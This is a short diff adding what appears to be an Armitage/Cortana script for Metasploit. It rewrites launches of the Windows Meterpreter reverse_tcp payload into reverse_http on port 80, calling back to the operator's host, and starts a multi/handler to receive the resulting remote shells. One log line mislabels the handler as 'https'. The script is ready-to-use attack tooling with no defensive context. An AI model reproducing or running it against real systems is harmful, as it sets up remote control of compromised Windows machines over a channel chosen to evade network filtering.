@@ -1,0 +1,17 @@
+# Replace meterpreter reverse tcp payloads with meterpreter reverse http
+
+filter user_launch {
+	if ($3['PAYLOAD'] eq "windows/meterpreter/reverse_tcp") {
+		$3['PAYLOAD'] = "windows/meterpreter/reverse_http";
+		$3['LHOST']   = lhost();
+		$3['LPORT']   = '80';
+		$3['DisablePayloadHandler'] = 1;
+		println("[*] Substituted reverse_http into launch of $2");
+	}
+	return @_;
+}
+
+on ready {
+	println("[*] Starting multi/handler for reverse https");
+	handler("windows/meterpreter/reverse_http", "80");
+}
